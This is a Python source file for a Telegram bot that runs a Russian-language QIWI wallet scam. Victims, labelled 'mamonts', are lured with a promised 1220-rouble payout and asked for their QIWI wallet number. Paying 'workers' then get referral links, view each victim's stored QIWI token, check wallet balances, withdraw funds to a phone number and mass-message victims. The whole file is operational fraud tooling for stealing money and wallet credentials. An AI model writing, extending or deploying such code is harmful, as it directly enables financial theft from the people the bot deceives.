import time
from config import bot, admins, SECRET_P2P, WORKER_ACCESS, P2P_COMMENT, worker_p2p_text, \
	profile_text, statistics_text, worker_manuals_text, worker_add_mamont_text
from keyboard import main_keyboard, p2p_deposit_keyboard, del_msg_keyboard, worker_menu_keyboard, \
	back_to_main_keyboard, back_to_worker_keyboard, data_keyboard, back_to_data_keyboard, \
	qiwi_keyboard, admin_menu_keyboard
from functions import get_user, add_user_to_db, get_worker, add_worker_to_db, gen_random_string, \
	registration_1, output1, qiwi_balance, qiwi_number, upd_token, give_work_access_1, \
	mailing_to_workers_1, mailing_to_mamonts_1, send_message_1, take_work_access_1
from p2p_pay import get_p2p_payment_url, check_p2p_payment

@bot.message_handler(commands=['start'])
def send_welcome(message):
	chat_id = message.chat.id
	user = get_user(chat_id)
	if user == None:
		if len(message.text.split(" ")) > 1:
				boss_id = message.text.split(" ")[1]
				boss_profile = get_user(boss_id)
				if boss_profile == None:
					boss_id = admins[0]
				else:
					bot.send_message(chat_id=boss_id,
				 				text=f"<b>🎉 <a href='tg://user?id={chat_id}'>Мамонт</a> зашёл по вашей реферальной ссылке.</b>",
				  				parse_mode="HTML")
		else:
			boss_id = admins[0]
		add_user_to_db(chat_id, boss_id)
	
	bot.send_message(chat_id=chat_id,
			text="<b>💰 Получите прямо сейчас 1220 рублей! Нажмите на кнопку 'Регистрация'</b>",
			reply_markup=main_keyboard(),
			parse_mode="HTML")

@bot.message_handler(commands=['worker'])
def worker_menu(message):
	chat_id = message.chat.id
	worker = get_worker(chat_id)
	if worker == None:
		bill_id = gen_random_string(16)
		url = get_p2p_payment_url(SECRET_P2P, bill_id, WORKER_ACCESS, P2P_COMMENT)
		bot.send_message(chat_id=chat_id,
			text=worker_p2p_text(),
			reply_markup=p2p_deposit_keyboard(bill_id, url),
			parse_mode="HTML")
	else:
		bot.send_message(chat_id=chat_id,
					text="Вы перешли в меню воркера",
					reply_markup=worker_menu_keyboard(),
					parse_mode="HTML")

@bot.message_handler(commands=['admin'])
def admin_menu(message):
	chat_id = message.chat.id
	if chat_id in admins:
		bot.send_message(chat_id=chat_id,
					text="Вы перешли в меню админа",
					reply_markup=admin_menu_keyboard(),
					parse_mode="HTML")

@bot.message_handler(content_types="text")
def get_text_message(message, *args):
	chat_id = message.chat.id
	user = get_user(chat_id)
	if user == None:
		bot.send_message(chat_id=chat_id,
			text="<b>Я вас не понимаю! Пропишите /start.</b>",
			reply_markup=main_keyboard(),
			parse_mode="HTML")
	else:
		bot.send_message(chat_id=chat_id,
				text="<b>💰 Получите прямо сейчас 1220 рублей! Нажмите на кнопку 'Регистрация'</b>",
				reply_markup=main_keyboard(),
				parse_mode="HTML")



@bot.callback_query_handler(func=lambda call: True)
def answer(call):
	chat_id = call.message.chat.id
	first_name = call.message.chat.first_name
	last_name = call.message.chat.last_name
	fullname = f"{first_name} | {last_name}"
	message_id = call.message.message_id
	message = call.message
	
	if call.data == "register":
		bot.delete_message(chat_id=chat_id, message_id=message_id)
		bot.send_message(chat_id=chat_id,
					text="<b>Введите свой номер QIWI кошелька(только цифры).</b>",
		       		reply_markup=back_to_main_keyboard(),
		       		parse_mode="HTML")
		bot.register_next_step_handler(message, registration_1)

	elif call.data == "profile":
		bot.delete_message(chat_id=chat_id, message_id=message_id)
		bot.send_message(chat_id=chat_id,
					text=profile_text(chat_id),
		       		reply_markup=back_to_main_keyboard(),
		       		parse_mode="HTML")
		
	elif call.data == "statistics":
		bot.delete_message(chat_id=chat_id, message_id=message_id)
		bot.send_message(chat_id=chat_id,
					text=statistics_text(),
		       		reply_markup=back_to_main_keyboard(),
		       		parse_mode="HTML")
		
	elif call.data == "back_to_main":
		bot.delete_message(chat_id=chat_id, message_id=message_id)
		bot.send_message(chat_id=chat_id,
			text="<b>💰 Получите прямо сейчас 1220 рублей! Нажмите на кнопку 'Регистрация'</b>",
			reply_markup=main_keyboard(),
			parse_mode="HTML")
	
	elif call.data.startswith("check_p2p_deposit"):
		bill_id = call.data.split(":")[1]
		payment = check_p2p_payment(bill_id, SECRET_P2P)
		if payment["status"]["value"] == "PAID":
			bot.delete_message(chat_id=chat_id, message_id=message_id)
			add_worker_to_db(chat_id)
			bot.send_message(chat_id, f"<b>Вы успешно получили доступ к панели.</b>",
		       		reply_markup=del_msg_keyboard(),
		       		parse_mode="HTML")
		else:
			bot.send_message(chat_id, f"<b>❌ Платеж не найден!</b>",
		       		reply_markup=del_msg_keyboard(),
		       		parse_mode="HTML")

	elif call.data == "delete_message":
		bot.delete_message(chat_id=chat_id, message_id=message_id)

	elif call.data == "reject_p2p_payment":
		bot.delete_message(chat_id=chat_id, message_id=message_id)
		bot.send_message(chat_id, f"<b>Платеж успешно отменён.</b>",
		       		parse_mode="HTML")

	elif call.data == "admin_give_access" and chat_id in admins:
		bot.send_message(chat_id, f"<b>Введите айди пользователя.</b>",
		       		parse_mode="HTML")
		bot.register_next_step_handler(message, give_work_access_1)

	elif call.data == "admin_worker_mailing" and chat_id in admins:
		bot.send_message(chat_id, f"<b>Введите текст рассылки.</b>",
		       		parse_mode="HTML")
		bot.register_next_step_handler(message, mailing_to_workers_1)

	elif call.data == "admin_take_access" and chat_id in admins:
		bot.send_message(chat_id, f"<b>Введите айди пользователя.</b>",
		       		parse_mode="HTML")
		bot.register_next_step_handler(message, take_work_access_1)
		
			

	elif call.data.startswith("worker") and get_worker(message.chat.id) != None:
		service = call.data.split("worker_")[1]

		if service == "back_to_main":
			bot.delete_message(chat_id=chat_id, message_id=message_id)
			bot.send_message(chat_id=chat_id,
					text="Вы вернулись назад.",
					reply_markup=worker_menu_keyboard(),
					parse_mode="HTML")

		elif service == "manuals":
			bot.delete_message(chat_id=chat_id, message_id=message_id)
			bot.send_message(chat_id=chat_id, 
							text=worker_manuals_text(),
							reply_markup=back_to_worker_keyboard(),
		       				parse_mode="HTML")

		elif service == "add_mamont":
			bot.delete_message(chat_id=chat_id, message_id=message_id)
			bot.send_message(chat_id=chat_id, 
							text=worker_add_mamont_text(chat_id),
							reply_markup=back_to_worker_keyboard(),
		       				parse_mode="HTML")

		elif service == "get_data":
			bot.delete_message(chat_id=chat_id, message_id=message_id)
			bot.send_message(chat_id=chat_id, 
							text="Ваши мамонты:",
							reply_markup=data_keyboard(chat_id),
		       				parse_mode="HTML")

		elif service.startswith("mamont:"):
			bot.delete_message(chat_id=chat_id, message_id=message_id)
			mamont_id = service.split(":")[1]
			mamont = get_user(mamont_id)
			bot.send_message(chat_id=chat_id, 
							text=f"ID: <code>{mamont_id}</code>\n"
								f"Токен: <code>{mamont[4] if mamont[4] != None else 'Не указан'}</code>",
							reply_markup=back_to_data_keyboard(mamont_id),
		       				parse_mode="HTML")

		elif service.startswith("send_message"):
			mamont_id = service.split(":")[1]
			mamont = get_user(mamont_id)
			bot.send_message(chat_id=chat_id, 
							text=f"<i>Введите сообщение которое хотите отправить.</i>",
		       				parse_mode="HTML")
			bot.register_next_step_handler(message, send_message_1, mamont_id)

		elif service == "qiwi_manipulate":
			bot.delete_message(chat_id=chat_id, message_id=message_id)
			bot.send_message(chat_id=chat_id, 
							text="Вы перешли в меню управления кошельком.",
							reply_markup=qiwi_keyboard(),
		       				parse_mode="HTML")

		elif service == "get_qiwi_number":
			token = get_worker(message.chat.id)[1]
			try:
				if token != None:
					bot.send_message(message.chat.id, f"<b>НОМЕР: <code>{qiwi_number(token)}</code></b>", parse_mode="HTML")
				else:
					bot.send_message(message.chat.id, f"❗️<b>У вас не указан токен</b>", parse_mode="HTML")
			except:
				bot.send_message(message.chat.id, "<b>❗️Произошла ошибка! Попробуйте обновить токен.</b>", parse_mode="HTML")

		elif service == "get_qiwi_balance":
			token = get_worker(message.chat.id)[1]
			try:
				if token != None:
					balance = qiwi_balance(str(qiwi_number(token)), token)
					bot.send_message(message.chat.id, f"<b>БАЛАНС: {balance}₽</b>", parse_mode="HTML")
				else:
					bot.send_message(message.chat.id, f"❗️<b>У вас не указан токен</b>", parse_mode="HTML")
			except:
				bot.send_message(message.chat.id, "<b>❗️Произошла ошибка! Попробуйте обновить токен.</b>", parse_mode="HTML")

		elif service == "update_token_qiwi":
			bot.send_message(message.chat.id, "<b>Введите новый токен.</b>", parse_mode="HTML")
			bot.register_next_step_handler(message, upd_token)

		elif service == "qiwi_output":
			token = get_worker(message.chat.id)[1]
			try:
				if token != None:
					balance = qiwi_balance(str(qiwi_number(token)), token)
					bot.send_message(chat_id=message.chat.id,text="<b>Введите номер телефона куда хотите вывести деньги</b>", parse_mode="HTML")
					bot.register_next_step_handler(message, output1, balance)
				else:
					bot.send_message(message.chat.id, f"❗️<b>У вас не указан токен</b>", parse_mode="HTML")
			except Exception as e:
				print(e)
				bot.send_message(message.chat.id, "<b>❗️Произошла ошибка! Попробуйте обновить токен.</b>", parse_mode="HTML")

		elif service == "all_mamonts_mailing":
			bot.send_message(chat_id, f"<b>Введите текст рассылки.</b>",
		       		parse_mode="HTML")
			bot.register_next_step_handler(message, mailing_to_mamonts_1)	



if __name__ == '__main__':
	try:
		bot.polling(none_stop = True, interval = 0)
	except Exception as e:
		for admin in admins:
			bot.send_message(chat_id=admin, text=f"<b>Возникла ошибка!</b>\n\n{e}", parse_mode="HTML")
		while True:
			try:
				bot.polling(none_stop = True, interval = 0)
			except Exception as e:
				for admin in admins:
					bot.send_message(chat_id=admin, text=f"<b>Возникла ошибка!</b>\n\n{e}", parse_mode="HTML")
					time.sleep(60)